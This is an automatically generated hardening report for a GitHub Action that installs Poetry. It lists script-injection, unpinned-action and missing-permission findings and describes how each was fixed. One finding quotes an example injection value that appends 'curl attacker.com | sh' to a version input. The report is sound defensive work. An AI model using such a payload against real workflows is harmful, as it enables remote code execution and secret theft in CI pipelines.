<!-- markdownlint-disable -->

# Hardening Report: abatilo--actions-poetry/v3.0.2

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **abatilo--actions-poetry/v3.0.2** was hardened automatically. 8 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Rule (a): `${{ inputs.poetry-version }}` is directly interpolated inside a `run:` shell command string on line 33 of action.yml: `pipx install poetry==${{ inputs.poetry-version }}`. An attacker-controlled input value is substituted directly into the shell command before the shell ever sees it, enabling arbitrary command injection (e.g. a value like `1.0.0; curl attacker.com | sh`).

Locations:

- `action.yml:33`

### script-injection (severity: high)

Rule (a) and (b): On line 37 of action.yml, `${{ inputs.poetry-plugins }}` is directly interpolated inside a `run:` shell command string: `ALL_PLUGINS=$(echo "${{ inputs.poetry-plugins }}")`. This is a direct expression interpolation (rule a). Additionally, on line 39, the derived shell variable `$PLUGIN` (populated from the untrusted input) is used unquoted in `poetry self add $PLUGIN`, allowing shell metacharacter injection (rule b).

Locations:

- `action.yml:37`
- `action.yml:39`

### unpinned-uses (severity: high)

Multiple `uses:` references in ci.yml are pinned to mutable tags or branch names instead of immutable 40-character SHA digests, making the workflow vulnerable to supply-chain attacks if those tags are moved or overwritten: `actions/checkout@v4` (line 14), `actions/setup-python@v5` (line 15), `actions/checkout@master` (line 33), `actions/setup-node@v4` (line 35).

Locations:

- `.github/workflows/ci.yml:14`
- `.github/workflows/ci.yml:15`
- `.github/workflows/ci.yml:33`
- `.github/workflows/ci.yml:35`

### unpinned-uses (severity: high)

`uses: amannn/action-semantic-pull-request@v5.4.0` in lint-pr.yml is pinned to a mutable version tag rather than an immutable 40-character SHA digest, making the workflow vulnerable to supply-chain attacks.

Locations:

- `.github/workflows/lint-pr.yml:12`

### missing-permissions (severity: medium)

ci.yml has no top-level `permissions:` key and none of its jobs (ci, ci-all, release) define job-level `permissions:` blocks. This means the workflow runs with the default (potentially broad) GitHub token permissions.

Locations:

- `.github/workflows/ci.yml:1`

### missing-permissions (severity: medium)

lint-pr.yml has no top-level `permissions:` key and its only job (`main`) has no job-level `permissions:` block. This means the workflow runs with the default (potentially broad) GitHub token permissions.

Locations:

- `.github/workflows/lint-pr.yml:1`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.poetry-version }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:33`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.poetry-plugins }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:37`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, static-inline-injection, unpinned-uses, missing-permissions

**Notes:**

Fixed all 8 findings across 3 files:

1. action.yml (script-injection / static-inline-injection):
   - Moved `${{ inputs.poetry-version }}` to env: block as POETRY_VERSION; used as `"poetry==$POETRY_VERSION"` in shell.
   - Moved `${{ inputs.poetry-plugins }}` to env: block as POETRY_PLUGINS; used xargs-based NUL-delimited tokenization into a bash array, then quoted each plugin in `poetry self add "$PLUGIN"`.

2. .github/workflows/ci.yml (unpinned-uses + missing-permissions):
   - Pinned actions/checkout@v4 → SHA 11d5960a...
   - Pinned actions/setup-python@v5 → SHA a26af69b...
   - Pinned actions/checkout@master → SHA 61b9e375...
   - Pinned actions/setup-node@v4 → SHA 49933ea5...
   - Added top-level `permissions: {}` and per-job permissions (contents:read for ci, {} for ci-all, contents:write for release).

3. .github/workflows/lint-pr.yml (unpinned-uses + missing-permissions):
   - Pinned amannn/action-semantic-pull-request@v5.4.0 → SHA e9fabac3...
   - Added top-level `permissions: {}` and job-level `pull-requests: read`.

